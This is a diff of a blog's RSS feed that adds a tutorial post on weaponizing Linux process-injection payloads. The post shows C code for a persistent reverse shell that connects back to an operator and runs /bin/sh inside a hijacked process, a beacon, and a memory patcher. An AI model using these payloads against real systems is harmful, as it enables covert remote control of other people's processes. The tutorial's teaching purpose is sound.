@@ -6,8 +6,373 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 15 Aug 2026 16:39:00 +0800</lastBuildDate>
+        <lastBuildDate>Fri, 04 Sep 2026 10:00:00 +0800</lastBuildDate>
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Step-by-Step Linux Process Injection Guide Part 5 - Weaponizing Payloads</title>
+            <link>https://mathscantor.github.io/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/</link>
+            <pubDate>Fri, 04 Sep 2026 10:00:00 +0800</pubDate>
+            <guid>https://mathscantor.github.io/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/</guid>
+            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
+&lt;p&gt;Part 4 loaded a shared library into the target and ran a constructor that printed a single line to stdout. That proves injection works, but it is not very useful on its own. A real payload needs to keep running (holding a shell open, beaconing home, or patching the target&amp;rsquo;s behaviour) without freezing the process it just hijacked.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;linworm&lt;/em&gt; solves this with a small framework that every payload shares. The constructor starts a background thread; the framework gives that thread a way to sleep, a way to stop, and a &lt;code&gt;SIGUSR2&lt;/code&gt; path that later lets the library unload itself. This article walks through that design, then shows three payloads built on top of it: a reverse shell, a heartbeat beacon, and a runtime memory patcher.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
+<p>Part 4 loaded a shared library into the target and ran a constructor that printed a single line to stdout. That proves injection works, but it is not very useful on its own. A real payload needs to keep running (holding a shell open, beaconing home, or patching the target&rsquo;s behaviour) without freezing the process it just hijacked.</p>
+<p><em>linworm</em> solves this with a small framework that every payload shares. The constructor starts a background thread; the framework gives that thread a way to sleep, a way to stop, and a <code>SIGUSR2</code> path that later lets the library unload itself. This article walks through that design, then shows three payloads built on top of it: a reverse shell, a heartbeat beacon, and a runtime memory patcher.</p>
+<h2 id="2-payload-handling-via-threads">2. Payload Handling via Threads</h2>
+<h3 id="21-why-threads">2.1 Why Threads?</h3>
+<p>The constructor runs on whatever thread called <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span>. In our case that is the target&rsquo;s main thread, which the injector forced through the trampoline. If the constructor blocks (waiting for a TCP connection, for example), the whole target hangs for as long as the payload lives.</p>
+<p>Starting a dedicated thread inside the constructor avoids that. The constructor creates the thread, returns immediately, and the main thread goes back to whatever it was doing. The payload runs in the background; the target carries on as normal.</p>
+<h3 id="22-the-common-framework">2.2 The Common Framework</h3>
+<p>Every payload in <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/</span> links against <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span>. The idea is always the same: initialise, start a thread, loop until told to stop, then clean up.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">my_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ... do work ...
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_sleep_ms</span>(<span style="color:#ae81ff">2000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">on_load</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">payload_init</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_start</span>(my_thread);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((destructor))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">on_unload</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (g_pipe_fd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_stop</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">on_load()</span> / <span style="font-family: Courier, monospace; font-weight: 600;">on_unload()</span>: Canonical Payload Skeleton from <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.h</span>
+  
+    <br><br>
+  
+</span>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">on_load()</span> runs when <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> finishes mapping the library. It sets up the framework and spawns the worker. The constructor then returns, so the target&rsquo;s main thread can resume. <span style="font-family: Courier, monospace; font-weight: 600;">on_unload()</span> runs if the process exits normally; it tells the worker to stop and waits for it to finish.</p>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span> is what &ldquo;sets up the framework&rdquo; actually means:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">payload_init</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(g_pipe_fd) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fcntl</span>(g_pipe_fd[<span style="color:#ae81ff">0</span>], F_SETFL, O_NONBLOCK);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fcntl</span>(g_pipe_fd[<span style="color:#ae81ff">1</span>], F_SETFL, O_NONBLOCK);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sigaction sa;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>sa, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    sa.sa_handler <span style="color:#f92672">=</span> payload_signal_handler;
+</span></span><span style="display:flex;"><span>    sa.sa_flags <span style="color:#f92672">=</span> SA_RESTART;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sigemptyset</span>(<span style="color:#f92672">&amp;</span>sa.sa_mask);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sigaction</span>(SIGUSR2, <span style="color:#f92672">&amp;</span>sa, NULL) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(g_pipe_fd[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(g_pipe_fd[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        g_pipe_fd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> g_pipe_fd[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Dl_info dl_info;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">dladdr</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)payload_init, <span style="color:#f92672">&amp;</span>dl_info) <span style="color:#f92672">&amp;&amp;</span> dl_info.dli_fname)
+</span></span><span style="display:flex;"><span>        g_self_handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlopen</span>(dl_info.dli_fname, RTLD_NOW <span style="color:#f92672">|</span> RTLD_NOLOAD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    g_running <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>: Pipe, <code>SIGUSR2</code> Handler, and Self-Handle
+  
+    <br><br>
+  
+</span>
+<p>Three pieces, each for a different later step:</p>
+<ul>
+<li>A pipe that the sleeping thread can wait on. Writing a byte into it is how shutdown wakes the worker early.</li>
+<li>A <code>SIGUSR2</code> handler, so an operator can ask the payload to stop while the target is still running.</li>
+<li>A <code>RTLD_NOLOAD</code> handle to the payload&rsquo;s own <code>.so</code>. That handle is unused until evacuation; Part 6 covers why it exists.</li>
+</ul>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">payload_start()</span> stores the user function and creates the thread behind a small wrapper. The worker itself is a loop: do work, then sleep, while <span style="font-family: Courier, monospace; font-weight: 600;">payload_running()</span> is true (<code>g_running != 0</code>). A plain <span style="font-family: Courier, monospace; font-weight: 600;">sleep()</span> would ignore shutdown until the timeout expires, so the framework sleeps by polling the pipe instead:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_sleep_ms</span>(<span style="color:#66d9ef">int</span> ms) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> pollfd pfd <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        .fd <span style="color:#f92672">=</span> g_pipe_fd[<span style="color:#ae81ff">0</span>],
+</span></span><span style="display:flex;"><span>        .events <span style="color:#f92672">=</span> POLLIN,
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">poll</span>(<span style="color:#f92672">&amp;</span>pfd, <span style="color:#ae81ff">1</span>, ms);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pfd.revents <span style="color:#f92672">&amp;</span> POLLIN) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> drain[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">read</span>(g_pipe_fd[<span style="color:#ae81ff">0</span>], drain, <span style="color:#66d9ef">sizeof</span>(drain)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>            ;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">payload_sleep_ms()</span>: Sleep That Shutdown Can Interrupt
+  
+    <br><br>
+  
+</span>
+<p>If nobody writes to the pipe, <span style="font-family: Courier, monospace; font-weight: 600;">poll()</span> just waits up to <code>ms</code> milliseconds, like a normal sleep. If shutdown writes a byte, <span style="font-family: Courier, monospace; font-weight: 600;">poll()</span> returns immediately and the loop sees <span style="font-family: Courier, monospace; font-weight: 600;">payload_running()</span> is now false. <span style="font-family: Courier, monospace; font-weight: 600;">write()</span> on a pipe is one of the few operations a signal handler is allowed to use, which is why this pattern (the <em>self-pipe trick</em>) shows up so often in Unix code.</p>
+<p>There are two ways to stop.</p>
+<p>Firstly, when the process exits, the destructor calls <span style="font-family: Courier, monospace; font-weight: 600;">payload_stop()</span>: it clears <code>g_running</code>, writes to the pipe, then <span style="font-family: Courier, monospace; font-weight: 600;">pthread_join()</span>s the worker and closes the pipe.</p>
+<p>Secondly, when the operator sends <code>SIGUSR2</code> instead, the handler does the same wake-up, plus it sets a second flag so the wrapper knows this was not a normal exit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_signal_handler</span>(<span style="color:#66d9ef">int</span> sig) {
+</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)sig;
+</span></span><span style="display:flex;"><span>    g_running <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    g_signal_shutdown <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">write</span>(g_pipe_fd[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>byte, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">payload_thread_wrapper</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_user_thread_func</span>(arg);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (g_signal_shutdown <span style="color:#f92672">&amp;&amp;</span> g_self_handle)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_self_unload</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">payload_signal_handler()</span> / <span style="font-family: Courier, monospace; font-weight: 600;">payload_thread_wrapper()</span>: <code>SIGUSR2</code> Handler and The Wrapper That Chooses Cleanup
+  
+    <br><br>
+  
+</span>
+<p>After the user thread returns, <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> runs only on the <code>SIGUSR2</code> path. It is how the payload removes its own library from the target. Part 6 will cover that trampoline in detail.</p>
+<h2 id="3-payload-examples">3. Payload Examples</h2>
+<p>The three payloads that ship with <em>linworm</em> all follow the skeleton above. The interesting part is what each thread does inside the loop.</p>
+<h3 id="31-reverse-shell">3.1 Reverse Shell</h3>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">src/payload/reverse_shell.c</span> connects back to the operator and runs an interactive shell over that socket. If the connection drops, it tries again. Host and port come from <code>LINWORM_RHOST</code> and <code>LINWORM_RPORT</code> in the <em>target&rsquo;s</em> environment, defaulting to <code>127.0.0.1:4444</code>, so the same <code>.so</code> can be aimed at different listeners without a rebuild.</p>
+<p>The outer loop is connect-or-retry:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rshell_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_log</span>(RSHELL_LOG, <span style="color:#e6db74">&#34;connecting to %s:%d...&#34;</span>, host, port);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_connection</span>(host, port);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sock <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">payload_log</span>(RSHELL_LOG, <span style="color:#e6db74">&#34;connection failed, retrying in %d ms&#34;</span>,
+</span></span><span style="display:flex;"><span>                        RECONNECT_MS);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">payload_sleep_ms</span>(RECONNECT_MS);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_log</span>(RSHELL_LOG, <span style="color:#e6db74">&#34;connected (fd=%d)&#34;</span>, sock);
+</span></span><span style="display:flex;"><span>        ...
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">rshell_thread()</span>: Connect, or Sleep <code>RECONNECT_MS</code> and Try Again
+  
+    <br><br>
+  
+</span>
+<p>Once the socket is up, the payload forks a child and points the child&rsquo;s stdin, stdout, and stderr at that socket:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rshell_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pid_t</span> child <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (child <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">dup2</span>(sock, STDIN_FILENO);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">dup2</span>(sock, STDOUT_FILENO);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">dup2</span>(sock, STDERR_FILENO);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">close</span>(sock);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (g_pipe_fd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">close</span>(g_pipe_fd[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (g_pipe_fd[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">close</span>(g_pipe_fd[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, NULL);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_exit</span>(<span style="color:#ae81ff">127</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">rshell_thread()</span>: Child Process, Interactive Shell Over The Socket
+  
+    <br><br>
+  
+</span>
+<p>The child also closes the self-pipe so it does not keep those file descriptors. The parent then watches the child with non-blocking <span style="font-family: Courier, monospace; font-weight: 600;">waitpid()</span>. If the shell exits, the outer loop reconnects. If <code>SIGUSR2</code> arrives first, the parent sends <code>SIGTERM</code> to the child, waits for it, and closes the socket.</p>
+<p>Let&rsquo;s see this working in action!</p>
+<video width=100% controls>
+    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/reverse-shell.mp4" type="video/webm">
+    Your browser does not support the video tag.  
+</video>
+<link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="video">
+  Reverse Shell Demo
+  
+    <br><br>
+  
+</span>
+<h3 id="32-beacon">3.2 Beacon</h3>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">src/payload/beacon.c</span> is the smallest payload: a heartbeat written to <span style="font-family: Courier, monospace; font-weight: 600;">/tmp/linworm_beacon.log</span> every <code>BEACON_INTERVAL_MS</code> (2 seconds).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">beacon_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)arg;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload_log</span>(BEACON_LOG, <span style="color:#e6db74">&#34;beacon started (pid=%d, tid=%ld)&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">getpid</span>(), (<span style="color:#66d9ef">long</span>)<span style="color:#a6e22e">pthread_self</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_log</span>(BEACON_LOG, <span style="color:#e6db74">&#34;heartbeat #%lu (pid=%d)&#34;</span>, counter<span style="color:#f92672">++</span>, <span style="color:#a6e22e">getpid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_sleep_ms</span>(BEACON_INTERVAL_MS);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload_log</span>(BEACON_LOG, <span style="color:#e6db74">&#34;beacon shutting down (pid=%d, %lu heartbeats sent)&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">getpid</span>(), counter);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">beacon_thread()</span>: Heartbeat Loop
+  
+    <br><br>
+  
+</span>
+<p>Inject it, tail the log, and you know the library loaded and the worker is alive. Here&rsquo;s a quick demonstration:</p>
+<video width=100% controls>
+    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/beacon.mp4" type="video/webm">
+    Your browser does not support the video tag.  
+</video>
+<link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="video">
+  Beacon Demo
+  
+    <br><br>
+  
+</span>
+<h3 id="33-patch">3.3 Patch</h3>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">src/payload/patch.c</span> rewrites bytes in the target at compile-time offsets, then puts them back on shutdown. The user-facing config is a module name and a table of patches:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define PATCH_TARGET &#34;example_target&#34;
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">patch_entry_t</span> PATCHES[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    { 
+</span></span><span style="display:flex;"><span>        .offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4ab</span>, 
+</span></span><span style="display:flex;"><span>        .patch_bytes <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span> }, 
+</span></span><span style="display:flex;"><span>        .orig_bytes  <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span> }, 
+</span></span><span style="display:flex;"><span>        .len <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> 
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* add more entries here */</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <code>PATCHES[]</code>: Offset, New Bytes, Original Bytes
+  
+    <br><br>
+  
+</span>
+<p><code>PATCH_TARGET</code> is matched against the path column in <span style="font-family: Courier, monospace; font-weight: 600;">/proc/self/maps</span>. The payload is already inside the target, so &ldquo;self&rdquo; <em>is</em> the target. That can be the main binary (<code>&quot;example_target&quot;</code>) or a library (<code>&quot;libc.so.6&quot;</code>). Each <code>patch_entry_t</code> is an offset from that module&rsquo;s base, the bytes to write, the originals to restore later, and a length.</p>
+<p>Code pages are not writable by default. <span style="font-family: Courier, monospace; font-weight: 600;">apply_patch()</span> flips the page to writable, copies the bytes, then restores execute-only permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">apply_patch</span>(<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>site, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>bytes, <span style="color:#66d9ef">size_t</span> len) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">set_page_perms</span>(site, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE <span style="color:#f92672">|</span> PROT_EXEC) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(site, bytes, len);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">set_page_perms</span>(site, PROT_READ <span style="color:#f92672">|</span> PROT_EXEC) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
